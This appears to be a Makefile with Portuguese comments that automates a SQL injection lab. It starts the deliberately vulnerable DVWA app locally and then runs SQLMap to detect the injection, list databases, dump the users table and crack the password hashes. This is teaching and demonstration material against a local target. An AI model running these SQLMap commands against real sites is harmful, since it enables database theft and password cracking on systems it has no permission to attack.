# Makefile da demo de SQL injection com SQLMap + DVWA
# Uso rapido:  make demo   (sobe o DVWA, configura e ataca)
#              make help    (lista todos os comandos)

IMAGE       := vulnerables/web-dvwa
NAME        := dvwa
PORT        := 80
BASE        := http://localhost:$(PORT)
URL         := $(BASE)/vulnerabilities/sqli/?id=1&Submit=Submit
COOKIE_FILE := .dvwa-cookie
LEVEL       ?= low

.PHONY: help up setup scan dump crack level demo down clean

help: ## Lista os comandos disponiveis
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) \
		| awk 'BEGIN{FS=":.*?## "}{printf "  \033[36m%-10s\033[0m %s\n",$$1,$$2}'

up: ## Sobe o container do DVWA e espera ficar pronto
	docker run -d --rm -p $(PORT):80 --name $(NAME) $(IMAGE)
	@echo "Aguardando o DVWA subir..."
	@until curl -s -o /dev/null $(BASE)/; do sleep 2; done
	@echo "DVWA no ar em $(BASE)"

setup: ## Cria o banco, faz login (admin/password) e salva o cookie de sessao
	@bash scripts/setup-dvwa.sh $(PORT) $(COOKIE_FILE)

scan: ## Roda o SQLMap: detecta a injecao e lista os bancos
	sqlmap -u "$(URL)" --cookie="$$(cat $(COOKIE_FILE))" --batch --dbs --flush-session

dump: ## Extrai a tabela dvwa.users (usuarios e hashes)
	sqlmap -u "$(URL)" --cookie="$$(cat $(COOKIE_FILE))" --batch -D dvwa -T users --dump

crack: ## Extrai a tabela users e quebra os hashes de senha (dicionario)
	sqlmap -u "$(URL)" --cookie="$$(cat $(COOKIE_FILE))" --batch --answers="crack=Y" -D dvwa -T users --dump

level: ## Troca a dificuldade do DVWA (ex: make level LEVEL=impossible)
	@test -f $(COOKIE_FILE) || { echo "Cookie nao encontrado. Rode 'make setup' primeiro." >&2; exit 1; }
	@case "$(LEVEL)" in low|medium|high|impossible) ;; \
		*) echo "LEVEL invalido: '$(LEVEL)'. Use low|medium|high|impossible." >&2; exit 1 ;; esac
	@sid=$$(grep -oE 'PHPSESSID=[a-z0-9]+' $(COOKIE_FILE)); \
		echo "security=$(LEVEL); $$sid" > $(COOKIE_FILE); \
		echo "[+] Nivel alterado para '$(LEVEL)'. Cookie: $$(cat $(COOKIE_FILE))"

demo: up setup scan dump ## Fluxo completo: sobe, configura, ataca e extrai os dados

down: ## Para e remove o container do DVWA
	-docker rm -f $(NAME)

clean: down ## Para o container e remove os artefatos gerados
	-rm -f $(COOKIE_FILE)
	-rm -rf $(HOME)/.local/share/sqlmap/output/localhost
